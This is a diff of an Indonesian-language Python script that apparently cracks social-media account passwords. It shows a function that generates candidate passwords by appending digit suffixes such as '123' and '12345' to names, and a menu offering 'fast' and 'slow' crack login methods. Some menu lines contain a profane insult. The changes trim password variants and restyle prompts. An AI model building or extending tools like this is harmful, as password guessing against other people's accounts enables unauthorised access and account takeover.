@@ -1585,20 +1585,16 @@ def generatev4(text):
 		if len(i)>=6 :
 			results.append(i)
 			results.append(i+"123")
-			results.append(i+"1234")
 			results.append(i+"12345")
 
 		elif len(i)==3 or len(i)==4 or len(i)==5 :
 			results.append(i+"123")
-			results.append(i+"1234")
 			results.append(i+"12345")
 
 		else:
 			results.append(i)
 			results.append(i+"123")
-			results.append(i+"1234")
 			results.append(i+"12345")
-			results.append(i+"123456")
 			results.append(text)
 	return results
 def log_api_1(em,pas):
@@ -1774,7 +1770,7 @@ class crackmenu:
 	
     def menu_crack(self):   # METHOD AUTO PASSWROD        
         jalan("\n \033[1;96m[\033[1;97m!\033[1;96m] \033[1;97mPilih Methode Login :")
-        print(" \033[1;96m[\033[1;97m1\033[1;96m] \033[1;97mB-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
+        print("\n \033[1;96m[\033[1;97m1\033[1;96m] \033[1;97mB-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
         print(" \033[1;96m[\033[1;97m2\033[1;96m] \033[1;97mB-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
         print(" \033[1;96m[\033[1;97m3\033[1;96m] \033[1;97mB-Api V3      ( Fast Crack  )");time.sleep(0.02)
         print(" \033[1;96m[\033[1;97m4\033[1;96m] \033[1;97mMbasic V1     ( Slow Crack  )");time.sleep(0.02)
@@ -1888,7 +1884,7 @@ class crackmenu:
                        mobile_n(pwx.split(','))
                        break
                     else:
-                       jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
+                       jalan(war+"Isi Dengan Benar");time.sleep(1)
                        crackmenu(isifile).passmenu(isifile)
 
         elif zk in ('d', 'D','Default','default'):
@@ -1896,7 +1892,7 @@ class crackmenu:
 #                pilih_alam()
 #                buat_angka()
                 self.menu_crack() #Pilihan Method
-                jm = input(war+"Pilih :")
+                jm = input('\n \033[1;96m[\033[1;97m?\033[1;96m] PILIH : \033[1;93m')
                 if jm == "":
                    jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                    crackmenu().passmenu()
@@ -1932,7 +1928,7 @@ class crackmenu:
 #                pilih_alam()
 #                buat_angka()
                 self.menu_crack() #Pilihan Method
-                jm = input(war+"Pilih :")
+                jm = input('\n \033[1;96m[\033[1;97m?\033[1;96m] PILIH : \033[1;93m')
                 if jm == "":
                    jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
                    crackmenu(isifile).passmenu(isifile)
